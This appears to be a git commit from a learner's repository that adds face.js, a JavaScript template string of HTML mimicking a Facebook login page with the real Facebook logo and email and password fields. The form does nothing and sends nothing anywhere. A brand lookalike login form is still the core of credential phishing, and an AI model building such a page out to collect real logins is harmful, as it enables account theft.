0fd7f06592e2c8b55ecdfaa76128b53d5446e35b
msbhh-ms <learnwithmsbhh@gmail.com>
2021-12-19 02:34:25 -0500

    1

---
+++ face.js
@@ -0,0 +1,22 @@
+let face = `
+<div class="main-grid">
+<img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="facebook-logo">
+
+</div>
+<div class="main-container">
+<div class="container">
+    <span>Login in to Facebook</span>
+    <form action="">
+        <small class="w-store"></small>
+        <input class="w-100 form-control " type="text" placeholder="Email address or phone number">
+        <small class="w-store"></small>
+        <input class="w-100 form-control mt-2" type="password" placeholder="Password">
+        <button class="btn btn-primary w-100 mt-2"><h4>Login</h4></button>
+
+    </form>
+    <div class="link">
+        <a href="#">Forgotten password? Signup for facebook</a>
+    </div>
+</div>
+</div>
+`
